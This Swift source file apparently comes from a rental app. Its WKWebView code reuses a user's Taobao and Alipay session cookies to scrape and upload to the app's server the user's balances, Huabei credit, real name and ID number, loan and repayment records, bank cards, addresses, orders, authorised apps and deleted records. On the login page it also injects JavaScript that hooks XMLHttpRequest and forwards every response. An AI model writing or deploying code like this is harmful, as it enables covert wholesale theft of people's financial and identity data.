//
//  TaoBaoAuthorized+WK.swift
//  NiuNiuRent
//
//  Created by Q Z on 2023/7/12.
//

import UIKit
import WebKit

extension TaoBaoAuthorizedManager {
    /**我的支付宝信息
     * 余额宝1
     * 余额2
     * 花呗3
     */
    func upMyZfbInfo(url: String?, t1: String, t2: String, type: Int) {
        print("upMyZfbInfo上报数据: " + t1 + "类型: \(type)")
        if type == 1 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yuebao")
        } else if type == 2 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yue")
        } else if type == 3 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "huabei")
            PostDataDTO.shared.postData(path: "index_money", content: t2, type: "huabei_total")
        }
    }
    
    /// 淘宝实名认证
    func tbAuthenticationName(url: String?, name: String, idCard: String) {
        print("淘宝实名认证: \(url ?? "")" + "name: \(name)")
        if url?.contains("https://member1.taobao.com/member/fresh/certify%20info.htm") == true{
            let body = ["name": name, "idcard": idCard]
            PostDataDTO.shared.postData(path: "index_money", content: body.toJson(), type: "taobao_auth_user")
        }
    }
    
    func showHtml(url: String?, body: String) {
        print("⚠️⚠️⚠️⚠️showHtml⚠️⚠️⚠️⚠️)")
        //网商个人信息
        if url?.contains("loan/profile.htm") == true {
            PostDataDTO.shared.postData(path: "bank_profile", content: body)
        }
        
        //网商还款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/home.html") == true {
            PostDataDTO.shared.postData(path: "bank_repay", content: body)
        }
        
        //网商借款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/record.html") == true {
            PostDataDTO.shared.postData(path: "bank_record", content: body)
        }
        
        // 淘宝地址
        if url?.contains("deliver_address.htm") == true {
            PostDataDTO.shared.postData(path: "address", content: body)
        }
        
        // 我的足迹 footmark/tbfoot
        if url?.contains("footmark/tbfoot") == true {
            PostDataDTO.shared.postData(path: "foot_mark", content: body)
//            if body.contains(find: "已售罄") || body.contains(find: "找相似") {
//                self.tbFootReloadCount = 100
//            }
        }
        
        // 绑卡信息https://zht.alipay.com/asset/bankList.htm
        if url?.contains("asset/bankList.htm") == true {
            PostDataDTO.shared.postData(path: "bind_bank", content: body)
        }
    }
}

extension TaoBaoAuthorizedManager {
    func getTBHtml() {
        let addressJS = "var url = window.location.href;" +
        "var body = document.getElementsByTagName('html')[0].outerHTML;" +
        "var data = {\"url\":url,\"html\":body};" +
        "window.webkit.messageHandlers.trackTbUrl.postMessage(data);"
        evaluateJavaScript(addressJS)
    }
    
    func getTBMemberInfoAndRealName(webView: WKWebView, absoluteString: String?) {
        getAllCookies(webView: webView, type: .memberInfoURL) { cook in
            DispatchQueue.global().async {
                TaoBaoSpider.shared.requestAlipay(type: .memberInfoURL)
                TaoBaoSpider.shared.requestAlipay(type: .userName)
            }
        }
    }
    
    // 授权列表
    func getAuthTokenManageList(webView: WKWebView, absoluteString: String?) {
        self.actionType = "应用授权"
        self.trackTbUrl(url: absoluteString ?? "", html: "")
        self.getAllCookies(webView: webView, type: .tokenManageURL) { _ in
            TaoBaoSpider.shared.requestAlipay(type: .tokenManageURL) { [weak self] content in
                if let content = content {
                    let startStr = "下一页&gt;</a>\n                <a href=\"https://openauth.alipay.com:443/auth/tokenManage.htm?pageNo="
                    let endStr = "\">尾页&gt;&gt;</a>\n"
                    let startIdx = content.range(of: startStr, options: .literal)?.upperBound
                    let endIdx = content.range(of: endStr, options: .literal)?.lowerBound
                    if let startIdx = startIdx, let endIdx = endIdx {
                        let page = content[startIdx..<endIdx]
                        self?.getAccreditData(webView: webView, totalPage: Int(page) ?? 0)
                    }
                }
            }
        }
    }
    
    /// 应用授权
    private  func getAccreditData(webView: WKWebView, totalPage: Int) {
        getAllCookies(webView: webView, type: .tokenManageURL) { cook in
            let page = totalPage > 10 ? 10:totalPage
            DispatchQueue.global().async {
                for idx in 2...page {
                    Thread.sleep(forTimeInterval: 0.1)
                    TaoBaoSpider.shared.requestAlipay(url: TaoBaoSpider.shared.tokenManageURL + "?pageNo=\(idx)", type: .tokenManageURL)
                }
            }
        }
    }
    func getOrders(webView: WKWebView, absoluteString: String?) {
        getAllCookies(webView: webView, type: .ordersURL) { [weak self] cook in
            TaoBaoSpider.shared.requestAlipay(type: .ordersURL) { [weak self] orderHtml in
                if let orderHtml = orderHtml {
                    DispatchQueue.main.async { [weak self] in
                        self?.parseOrderDetails(orderHtml: orderHtml, absoluteString: absoluteString)
                    }
                }
            }
        }
    }
    
    // 订单列表
   private func parseOrderDetails(orderHtml: String, absoluteString: String?) {
        print("==========订单列表信息===========:\(orderHtml)")
        self.actionType = "订单列表"
        self.trackTbUrl(url: "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm", html: orderHtml)
        var orderHtmlString = orderHtml.components(separatedBy: "JSON.parse('")[safe: 1]
        orderHtmlString = orderHtmlString?.components(separatedBy: "');")[safe: 0]
        orderHtmlString = orderHtmlString?.replacingOccurrences(of: "\\\"", with: "\"")
        let dic = orderHtmlString?.toDictionary()
        let array = dic?["mainOrders"] as? [[String: Any]]
        var index = 1;
        array?.forEach({ [weak self] obj in
            if index <= 10{
                if #available(iOS 13.0, *) {
                    Task {
                        let statusInfo = obj["statusInfo"] as? [String: Any]
                        if let orderUrl = statusInfo?["url"] as? String,
                           let url = URL(string: "https:" + orderUrl) {
                            self?.getOrderDetail(url)
                        }
                    }
                } else {
                    let statusInfo = obj["statusInfo"] as? [String: Any]
                    if let orderUrl = statusInfo?["url"] as? String,
                       let url = URL(string: "https:" + orderUrl) {
                        self?.getOrderDetail(url)
                    }
                }
            } else {
                return
            }
            index = index + 1
        })
    }

    private func getOrderDetail(_ url: URL) {
        print("订单详情：\(url)")
        let cookieStore = self.webView?.configuration.websiteDataStore.httpCookieStore
        cookieStore?.getAllCookies({ [weak self] cook in
            guard let `self` = self else { return }
            self.cookieArray = cook
            self.storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
            TaoBaoSpider.shared.requestAlipay(url: url.absoluteString, type: .ordersDetailURL)
        })
    }
    
    // 回收站列表
    func getTrashPageList(webView: WKWebView, absoluteString: String?) {
        self.actionType = "回收站列表"
        self.trackTbUrl(url: absoluteString ?? "", html: "")
        self.getAllCookies(webView: webView, type: .trashURL) { _ in
            TaoBaoSpider.shared.requestAlipay(type: .trashURL) { [weak self] content in
                if let content = content {
                    let startStr = "下一页&gt;</a>\n                        <a class=\"page-end\" href=\"https://consumeprod.alipay.com:443/record/trashIndex.htm?dateType=deleteDate&orderBy=desc&pageNum="
                    let endStr = "\">尾页&gt;&gt;</a>\n"
                    let startIdx = content.range(of: startStr, options: .literal)?.upperBound
                    let endIdx = content.range(of: endStr, options: .literal)?.lowerBound
                    if let startIdx = startIdx, let endIdx = endIdx {
                        let page = content[startIdx..<endIdx]
                        self?.getTrashPage(webView: webView, totalPage: Int(page) ?? 0, type: .trashURL)
                    }
                }
            }
        }
    }
    
    /// 回收站
    private func getTrashPage(webView: WKWebView, totalPage: Int, type: TaoBaoSpiderType) {
        getAllCookies(webView: webView, type: type) { cook in
            DispatchQueue.global().async {
                let page = totalPage > 10 ? 10:totalPage
                for idx in 2...page {
                    Thread.sleep(forTimeInterval: 0.1)
                    TaoBaoSpider.shared.requestAlipay(url: type.rawValue + "?dateType=deleteDate&orderBy=desc&pageNum=\(idx)", type: type)
                }
            }
        }
    }
    
    
    func getAddress(webView: WKWebView, absoluteString: String?) {
        self.getAddress = true
        self.actionType = "登录成功"
        self.loadUrlStr("https://member1.taobao.com/member/fresh/deliver_address.htm")
    }
    
    func clickTBQrcode(webView: WKWebView){
        if webView.url?.absoluteString.hasSuffix("https://login.taobao.com/") == true{
            let injectionJSString = "(function() {\n" +
            "    var origOpen = XMLHttpRequest.prototype.open;var url = arguments[1];\n"  +
            "    XMLHttpRequest.prototype.open = function() {\n"  +
            "        this.addEventListener('load', function() {\n"  +
            "            var data = {\"url\":url,\"responseText\":this.responseText};  \n" +
            "            window.webkit.messageHandlers.ajaxDone.postMessage(data);  \n" +
            "        });\n"  +
            "        origOpen.apply(this, arguments);\n"  +
            "    };\n"  +
            "})();"
            self.actionType = "点击二维码"
            evaluateJavaScript(injectionJSString)
            /// 点击二维码
            let clickJs = "document.getElementsByClassName(\"icon-qrcode\")[0].click();"
            evaluateJavaScript(clickJs)
        }
    }
    
    func getPageData(webView: WKWebView, type: TaoBaoSpiderType) {
        self.getAllCookies(webView: webView, type: type) { cook in
            Thread.sleep(forTimeInterval: 0.1)
            DispatchQueue.global().async {
                self.actionType = type.desc
                self.trackTbUrl(url: type.rawValue, html: "")
                TaoBaoSpider.shared.requestAlipay(type: type)
            }
        }
    }
    
    func getAllCookies(webView: WKWebView, type: TaoBaoSpiderType, callback: @escaping ([HTTPCookie]) -> Void){
        DispatchQueue.main.async {
            let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
            cookieStore.getAllCookies({ [weak self] cook in
                guard let `self` = self else { return }
                self.cookieArray = cook
                if let url = URL(string: type.rawValue) {
                    self.storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
                    callback(cook)
                }
            })
        }
    }
    
    func webViewGoBack() {
        DispatchQueue.main.async { [weak self] in
            self?.webView?.goBack()
        }
    }
    
    func evaluateJavaScript(_ jsStr: String?) {
        guard let jsStr = jsStr else { return }
        DispatchQueue.main.async { [weak self] in
            self?.webView?.evaluateJavaScript(jsStr){ data, error in}
        }
    }
    
    func loadUrlStr(_ urlStr: String) {
        DispatchQueue.main.async { [weak self] in
            let url = URL(string: urlStr)!
            let request =  URLRequest(url: url)
            self?.webView?.load(request)
        }
    }
    
     
}
